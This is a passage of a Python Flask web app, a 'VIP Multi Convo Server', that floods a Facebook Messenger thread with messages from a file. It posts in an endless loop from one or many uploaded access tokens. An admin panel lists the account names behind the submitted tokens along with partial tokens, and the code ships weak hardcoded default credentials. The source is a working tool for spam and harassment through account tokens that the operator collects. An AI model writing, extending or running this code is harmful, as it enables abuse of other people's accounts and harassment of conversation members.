from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
import requests
from threading import Thread, Event, Lock
import time
import random
import string
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'fallback_secret_key_2024_vip')
app.debug = False  # Production में False रखें

# Admin credentials - Environment variables में store करें
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'vip123')

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
task_status = {}
task_stats = {}
status_lock = Lock()

def check_token_validity(access_token):
    """Check if a Facebook access token is valid"""
    try:
        url = f"https://graph.facebook.com/v15.0/me"
        params = {'access_token': access_token, 'fields': 'id,name'}
        response = requests.get(url, params=params, headers=headers, timeout=10)
        result = response.json()
        if 'id' in result and 'name' in result:
            return True, result['name']
        else:
            return False, "Invalid token"
    except Exception as e:
        return False, f"Error: {str(e)}"

def send_e2e_message(access_token, thread_id, message):
    """Send end-to-end encrypted message to Facebook"""
    try:
        url = f"https://graph.facebook.com/v15.0/t_{thread_id}/messages"
        params = {
            'recipient': f"{{'thread_key':'{thread_id}'}}",
            'message': f"{{'text':'{message}'}}",
            'messaging_type': 'MESSAGE_TAG',
            'tag': 'NON_PROMOTIONAL_SUBSCRIPTION',
            'access_token': access_token
        }
        response = requests.post(url, data=params, headers=headers, timeout=10)
        result = response.json()
        if 'message_id' in result:
            print(f"E2E Message Sent Successfully: {message}")
            return True
        else:
            print(f"E2E Message Failed: {response.text}")
            return False
    except Exception as e:
        print(f"Error sending E2E message: {str(e)}")
        return False

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id, use_e2e=False):
    stop_event = stop_events[task_id]
    with status_lock:
        task_status[task_id] = {
            'running': True,
            'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'total_messages': 0,
            'successful_messages': 0,
            'failed_messages': 0,
            'current_token': 0,
            'token_count': len(access_tokens),
            'last_message': '',
            'active': True,
            'user': 'VIP User'
        }
        task_stats[task_id] = {
            'token_stats': {token: {'success': 0, 'fail': 0} for token in access_tokens}
        }

    valid_tokens = []
    token_names = {}

    # Validate tokens
    for i, token in enumerate(access_tokens):
        is_valid, token_info = check_token_validity(token)
        if is_valid:
            valid_tokens.append(token)
            token_names[token] = token_info
            print(f"Token {i+1}: Valid ({token_info})")
        else:
            print(f"Token {i+1}: Invalid - {token_info}")

    if not valid_tokens:
        with status_lock:
            task_status[task_id]['running'] = False
            task_status[task_id]['error'] = "No valid tokens found"
        return

    with status_lock:
        task_status[task_id]['valid_tokens'] = len(valid_tokens)
        task_status[task_id]['token_names'] = token_names

    # Send messages
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
                
            for i, access_token in enumerate(valid_tokens):
                if stop_event.is_set():
                    break
                    
                with status_lock:
                    task_status[task_id]['current_token'] = i + 1
                
                # Prepare message
                message = str(mn) + ' ' + message1
                success = False
                
                try:
                    if use_e2e:
                        success = send_e2e_message(access_token, thread_id, message)
                    else:
                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                        parameters = {'access_token': access_token, 'message': message}
                        response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                        success = response.status_code == 200
                        
                    if success:
                        print(f"Message Sent Successfully From token {i+1}: {message}")
                    else:
                        print(f"Message Sent Failed From token {i+1}: {message}")

                except Exception as e:
                    print(f"Error sending message: {str(e)}")
                    success = False

                # Update statistics
                with status_lock:
                    task_status[task_id]['total_messages'] += 1
                    if success:
                        task_status[task_id]['successful_messages'] += 1
                        task_stats[task_id]['token_stats'][access_token]['success'] += 1
                    else:
                        task_status[task_id]['failed_messages'] += 1
                        task_stats[task_id]['token_stats'][access_token]['fail'] += 1
                    task_status[task_id]['last_message'] = message
                    task_status[task_id]['last_update'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                time.sleep(time_interval)
                
    # Cleanup after stop
    with status_lock:
        task_status[task_id]['running'] = False
        task_status[task_id]['end_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Admin authentication decorator
def admin_required(f):
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            session['admin_username'] = username
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template_string('''
            <div style="background: #ff6b6b; color: white; padding: 20px; text-align: center;">
                <h2>Invalid Credentials</h2>
                <a href="/admin/login">Try Again</a>
            </div>
            ''')
    
    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login - VIP System</title>
    <style>
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            width: 350px;
            text-align: center;
        }
        .vip-badge {
            background: linear-gradient(135deg, #ffd700, #ffa500);
            color: black;
            padding: 10px;
            border-radius: 20px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background: #764ba2;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="vip-badge">
            <i class="fas fa-crown"></i> VIP ADMIN PANEL
        </div>
        <h2>Admin Login</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <p style="margin-top: 15px;">
            <a href="/">← Back to Main App</a>
        </p>
    </div>
</body>
</html>
''')

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    with status_lock:
        active_tasks = {k: v for k, v in task_status.items() if v.get('running', False)}
        total_tasks = len(task_status)
        total_users = len(set(task.get('user', 'Unknown') for task in task_status.values()))
        
        total_messages = sum(task.get('total_messages', 0) for task in task_status.values())
        successful_messages = sum(task.get('successful_messages', 0) for task in task_status.values())
        failed_messages = sum(task.get('failed_messages', 0) for task in task_status.values())
    
    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard - VIP System</title>
    <style>
        body { 
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .dashboard-header {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
        }
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,215,0,0.3);
        }
        .task-list {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        .task-item {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border-left: 4px solid #ffd700;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            font-weight: bold;
        }
        .btn-danger { background: #ff4757; color: white; }
        .btn-primary { background: #3742fa; color: white; }
        .nav { 
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .nav a { 
            color: white; 
            text-decoration: none; 
            padding: 10px 20px;
            background: rgba(255,255,255,0.1);
            border-radius: 5px;
            border: 1px solid #ffd700;
        }
        .vip-badge {
            background: linear-gradient(135deg, #ffd700, #ffa500);
            color: black;
            padding: 5px 15px;
            border-radius: 15px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="nav">
        <a href="/">🏠 Main App</a>
        <a href="/admin/dashboard">📊 Dashboard</a>
        <a href="/admin/tokens">🔑 Tokens</a>
        <a href="/admin/logout">🚪 Logout</a>
    </div>

    <div class="dashboard-header">
        <div class="vip-badge">VIP ADMIN DASHBOARD</div>
        <h1>System Overview</h1>
        <p>Welcome, {{ session.admin_username }}</p>
    </div>

    <div class="stats-container">
        <div class="stat-card">
            <h3>🔄 Active Tasks</h3>
            <h2>{{ active_tasks|length }}</h2>
        </div>
        <div class="stat-card">
            <h3>📋 Total Tasks</h3>
            <h2>{{ total_tasks }}</h2>
        </div>
        <div class="stat-card">
            <h3>👥 Total Users</h3>
            <h2>{{ total_users }}</h2>
        </div>
        <div class="stat-card">
            <h3>📨 Total Messages</h3>
            <h2>{{ total_messages }}</h2>
        </div>
        <div class="stat-card">
            <h3>✅ Success Rate</h3>
            <h2>{{ (successful_messages/total_messages*100 if total_messages > 0 else 0)|round(2) }}%</h2>
        </div>
    </div>

    <div class="task-list">
        <h2>🎯 Active Tasks</h2>
        {% for task_id, task in active_tasks.items() %}
        <div class="task-item">
            <strong>Task ID:</strong> {{ task_id[:15] }}...<br>
            <strong>User:</strong> {{ task.get('user', 'Unknown') }}<br>
            <strong>Messages:</strong> {{ task.get('successful_messages', 0) }}/{{ task.get('total_messages', 0) }}<br>
            <strong>Tokens:</strong> {{ task.get('valid_tokens', 0) }}/{{ task.get('token_count', 0) }}<br>
            <strong>Last Update:</strong> {{ task.get('last_update', 'N/A') }}<br>
            <button class="btn btn-danger" onclick="stopTask('{{ task_id }}')">🛑 Stop Task</button>
        </div>
        {% else %}
        <p>No active tasks running</p>
        {% endfor %}
    </div>

    <script>
    function stopTask(taskId) {
        if(confirm('Are you sure you want to stop this task?')) {
            fetch('/admin/stop_task', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({task_id: taskId})
            }).then(response => response.json())
              .then(data => {
                  alert(data.message);
                  location.reload();
              });
        }
    }
    </script>
</body>
</html>
''', active_tasks=active_tasks, total_tasks=total_tasks, total_users=total_users,
     total_messages=total_messages, successful_messages=successful_messages)

@app.route('/admin/tokens')
@admin_required
def admin_tokens():
    all_tokens = {}
    with status_lock:
        for task_id, task in task_status.items():
            if task.get('token_names'):
                all_tokens.update(task['token_names'])
    
    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>Token Management - VIP System</title>
    <style>
        body { 
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .nav { 
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .nav a { 
            color: white; 
            text-decoration: none; 
            padding: 10px 20px;
            background: rgba(255,255,255,0.1);
            border-radius: 5px;
            border: 1px solid #ffd700;
        }
        .token-list {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        .token-item {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            word-break: break-all;
            border-left: 4px solid #2ed573;
        }
        .vip-badge {
            background: linear-gradient(135deg, #ffd700, #ffa500);
            color: black;
            padding: 5px 15px;
            border-radius: 15px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="nav">
        <a href="/">🏠 Main App</a>
        <a href="/admin/dashboard">📊 Dashboard</a>
        <a href="/admin/tokens">🔑 Tokens</a>
        <a href="/admin/logout">🚪 Logout</a>
    </div>

    <div class="token-list">
        <div class="vip-badge">TOKEN MANAGEMENT</div>
        <h1>Active Tokens</h1>
        <h3>Total Valid Tokens: {{ all_tokens|length }}</h3>
        {% for token, name in all_tokens.items() %}
        <div class="token-item">
            <strong>👤 Name:</strong> {{ name }}<br>
            <strong>🔑 Token:</strong> {{ token[:30] }}...{{ token[-10:] }}<br>
            <strong>✅ Status:</strong> <span style="color: #2ed573;">Valid</span>
        </div>
        {% else %}
        <p>No active tokens found</p>
        {% endfor %}
    </div>
</body>
</html>
''', all_tokens=all_tokens)

@app.route('/admin/stop_task', methods=['POST'])
@admin_required
def admin_stop_task():
    data = request.get_json()
    task_id = data.get('task_id')
    if task_id in stop_events:
        stop_events[task_id].set()
        return jsonify({'message': f'Task {task_id} stopped successfully'})
    else:
        return jsonify({'error': 'Task not found'}), 404

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    session.pop('admin_username', None)
    return redirect(url_for('admin_login'))

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        try:
            token_option = request.form.get('tokenOption')
            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
            else:
                token_file = request.files['tokenFile']
                access_tokens = token_file.read().decode().strip().splitlines()

            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))
            use_e2e = request.form.get('e2eOption') == 'true'

            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id, use_e2e))
            threads[task_id] = thread
            thread.start()

            return f'''
            <div style="background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; padding: 30px; border-radius: 15px; text-align: center; border: 2px solid #ffd700;">
                <h2 style="color: #ffd700;">🚀 VIP TASK LAUNCHED SUCCESSFULLY!</h2>
                <div style="background: rgba(255,215,0,0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
                    <p><strong>🎯 Task ID:</strong> {task_id}</p>
                    <p><strong>💬 Thread ID:</strong> {thread_id}</p>
                    <p><strong>🔑 Tokens Used:</strong> {len(access_tokens)}</p>
                    <p><strong>📝 Messages Loaded:</strong> {len(messages)}</p>
                    <p><strong>⏱️ Time Interval:</strong> {time_interval}s</p>
                </div>
                <div style="margin-top: 20px;">
                    <a href="/" style="color: #ffd700; margin: 10px; padding: 10px 20px; border: 1px solid #ffd700; border-radius: 5px; text-decoration: none;">← Back to Main</a>
                    <a href="/admin/dashboard" style="color: #00ff00; margin: 10px; padding: 10px 20px; border: 1px solid #00ff00; border-radius: 5px; text-decoration: none;">📊 View in Admin Panel</a>
                </div>
            </div>
            '''
        except Exception as e:
            return f'''
            <div style="background: #ff6b6b; color: white; padding: 30px; border-radius: 15px; text-align: center;">
                <h2>❌ Error Starting Task</h2>
                <p>{str(e)}</p>
                <a href="/" style="color: white; text-decoration: underline;">← Back to Main</a>
            </div>
            '''

    # Main VIP Interface HTML
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🔥 VIP MULTI CONVO SERVER</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    margin: 0;
    padding: 20px;
    background: 
        radial-gradient(circle at 10% 20%, rgba(255, 215, 0, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 90% 80%, rgba(255, 140, 0, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 50% 50%, rgba(255, 69, 0, 0.08) 0%, transparent 30%),
        linear-gradient(135deg, #000000 0%, #1a0d00 25%, #331a00 50%, #4d2600 75%, #663300 100%);
    min-height: 100vh;
    font-family: 'Orbitron', sans-serif;
    color: #ffa500;
    position: relative;
    overflow-x: hidden;
}

.vip-badge {
    position: fixed;
    top: 20px;
    right: 20px;
    background: linear-gradient(135deg, #ffd700, #ffa500);
    color: #000;
    padding: 10px 20px;
    border-radius: 20px;
    font-weight: bold;
    z-index: 1000;
    box-shadow: 0 0 20px #ffd700;
}

.admin-access {
    position: fixed;
    top: 20px;
    left: 20px;
    background: linear-gradient(135deg, #00ff00, #008800);
    color: #000;
    padding: 10px 20px;
    border-radius: 20px;
    font-weight: bold;
    z-index: 1000;
    box-shadow: 0 0 20px #00ff00;
    text-decoration: none;
}

.gold-text {
    background: linear-gradient(135deg, #ffd700, #ffa500, #ff8c00);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
}

h1 {
    font-size: 3.5rem;
    text-align: center;
    margin: 60px 0 30px 0;
    text-shadow: 
        0 0 20px #ffa500,
        0 0 40px #ff8c00,
        0 0 60px #ff4500;
    animation: goldGlow 2s ease-in-out infinite alternate;
}

@keyframes goldGlow {
    0% { text-shadow: 0 0 20px #ffa500, 0 0 40px #ff8c00; }
    100% { text-shadow: 0 0 30px #ffd700, 0 0 60px #ffa500, 0 0 80px #ff8c00; }
}

.vip-container {
    max-width: 1000px;
    margin: 0 auto;
    padding: 40px;
    background: rgba(0, 0, 0, 0.85);
    border-radius: 20px;
    border: 2px solid #ffd700;
    box-shadow: 
        0 0 50px rgba(255, 215, 0, 0.3),
        inset 0 0 50px rgba(255, 215, 0, 0.1);
    position: relative;
}

.vip-features {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 20px;
    margin: 30px 0;
}

.feature-card {
    background: rgba(255, 215, 0, 0.1);
    padding: 20px;
    border-radius: 10px;
    text-align: center;
    border: 1px solid #ffd700;
    transition: transform 0.3s ease;
}

.feature-card:hover {
    transform: translateY(-5px);
}

.feature-card i {
    font-size: 2rem;
    color: #ffd700;
    margin-bottom: 10px;
}

.form-group {
    margin-bottom: 25px;
}

.form-label {
    display: block;
    margin-bottom: 12px;
    color: #ffd700;
    font-weight: 600;
    font-size: 1.2rem;
}

.form-control {
    width: 100%;
    padding: 16px;
    background: rgba(255, 215, 0, 0.1);
    border: 1px solid #ffd700;
    border-radius: 8px;
    color: #ffd700;
    font-size: 1.1rem;
    transition: all 0.3s ease;
    font-family: 'Share Tech Mono', monospace;
}

.form-control:focus {
    border-color: #ffa500;
    box-shadow: 0 0 20px rgba(255, 165, 0, 0.5);
    outline: none;
    background: rgba(255, 215, 0, 0.2);
}

.btn-vip {
    background: linear-gradient(135deg, #ffd700, #ffa500);
    color: #000;
    padding: 18px 35px;
    font-size: 1.2rem;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    font-weight: bold;
    text-transform: uppercase;
    letter-spacing: 2px;
    transition: all 0.3s ease;
    width: 100%;
    margin: 10px 0;
    font-family: 'Orbitron', sans-serif;
}

.btn-vip:hover {
    transform: translateY(-3px);
    box-shadow: 0 10px 30px rgba(255, 215, 0, 0.5);
}

.btn-admin {
    background: linear-gradient(135deg, #00ff00, #008800);
    color: #000;
}

.stats-panel {
    background: rgba(255, 215, 0, 0.1);
    padding: 20px;
    border-radius: 10px;
    margin: 20px 0;
    border: 1px solid #ffd700;
}

.stats-panel h3 {
    color: #ffd700;
    margin-bottom: 15px;
}

@media (max-width: 768px) {
    h1 { font-size: 2.2rem; }
    .vip-container { padding: 20px; }
    .vip-badge, .admin-access { 
        position: static; 
        display: block;
        margin: 10px auto;
        text-align: center;
        width: fit-content;
    }
}
</style>
</head>
<body>
    <div class="vip-badge">
        <i class="fas fa-crown"></i> VIP EDITION
    </div>
    
    <a href="/admin/login" class="admin-access">
        <i class="fas fa-shield-alt"></i> ADMIN PANEL
    </a>

    <h1 class="gold-text">🔥 VIP MULTI CONVO SERVER</h1>
    
    <div class="vip-container">
        <div class="vip-features">
            <div class="feature-card">
                <i class="fas fa-bolt"></i>
                <h3>High Speed</h3>
                <p>Lightning Fast Messaging</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-shield-alt"></i>
                <h3>Secure</h3>
                <p>E2E Encryption</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-users"></i>
                <h3>Multi-Token</h3>
                <p>Multiple Accounts</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-chart-line"></i>
                <h3>Real-Time Stats</h3>
                <p>Live Monitoring</p>
            </div>
        </div>

        <form method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <label class="form-label"><i class="fas fa-key"></i> TOKEN OPTION:</label>
                <select name="tokenOption" class="form-control" onchange="toggleInputs(this.value)">
                    <option value="single">SINGLE TOKEN</option>
                    <option value="multi">MULTI TOKENS</option>
                </select>
            </div>

            <div id="singleInput" class="form-group">
                <label class="form-label"><i class="fas fa-user"></i> SINGLE TOKEN:</label>
                <input type="text" name="singleToken" class="form-control" placeholder="Enter VIP Access Token">
            </div>

            <div id="multiInputs" class="form-group" style="display:none;">
                <label class="form-label"><i class="fas fa-users"></i> TOKEN FILE:</label>
                <input type="file" name="tokenFile" class="form-control" accept=".txt">
            </div>

            <div class="form-group">
                <label class="form-label"><i class="fas fa-comment"></i> CONVERSATION ID:</label>
                <input type="text" name="threadId" class="form-control" placeholder="Enter Thread ID" required>
            </div>

            <div class="form-group">
                <label class="form-label"><i class="fas fa-file-alt"></i> MESSAGE FILE:</label>
                <input type="file" name="txtFile" class="form-control" accept=".txt" required>
            </div>

            <div class="form-group">
                <label class="form-label"><i class="fas fa-clock"></i> TIME INTERVAL (SEC):</label>
                <input type="number" name="time" class="form-control" placeholder="Enter Time Interval" min="5" value="10" required>
            </div>

            <div class="form-group">
                <label class="form-label"><i class="fas fa-signature"></i> SENDER NAME:</label>
                <input type="text" name="kidx" class="form-control" placeholder="Enter Sender Name" required>
            </div>

            <button class="btn-vip" type="submit">
                <i class="fas fa-rocket"></i> LAUNCH VIP MISSION
            </button>
        </form>

        <div class="stats-panel">
            <h3 class="gold-text"><i class="fas fa-chart-bar"></i> LIVE SYSTEM STATISTICS</h3>
            <p><i class="fas fa-tasks"></i> Active Tasks: <span id="activeTasks" style="color: #00ff00;">0</span></p>
            <p><i class="fas fa-paper-plane"></i> Total Messages Sent: <span id="totalMessages" style="color: #00ff00;">0</span></
